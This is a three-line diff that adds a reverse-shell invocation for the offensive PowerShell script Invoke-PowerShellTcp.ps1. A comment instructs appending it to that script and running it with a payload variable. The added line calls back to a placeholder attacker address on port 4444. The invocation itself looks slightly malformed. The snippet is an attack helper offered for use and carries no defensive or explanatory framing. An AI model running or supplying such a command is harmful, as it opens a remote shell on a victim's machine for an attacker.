@@ -1,0 +1,3 @@
+#Append this to the Invoke-PowerShellTcp.ps1 script, and run with a -Payload variable
+
+;Power  Reverse -IPAddress <your ip here> -Port 4444
